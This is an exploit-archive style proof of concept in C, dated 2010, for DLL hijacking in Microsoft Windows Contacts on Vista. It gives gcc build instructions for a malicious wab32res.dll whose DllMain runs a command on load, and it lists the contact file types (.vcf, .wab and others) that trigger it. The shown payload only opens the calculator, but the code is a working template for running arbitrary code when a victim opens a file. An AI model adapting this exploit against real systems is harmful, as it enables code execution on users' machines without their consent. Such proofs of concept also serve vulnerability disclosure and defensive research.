/*

Exploit Title: Microsoft Windows Contacts DLL Hijacking Exploit (wab32res.dll)
Date: August 25, 2010
Author: storm (storm@gonullyourself.org)
Tested on: Windows Vista SP2

http://www.gonullyourself.org/

gcc -shared -o wab32res.dll Contacts-DLL.c

.contact, .group, .p7c, .vcf, and .wab files are affected.

*/

#include <windows.h>

int hax()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  hax();
  return 0;
}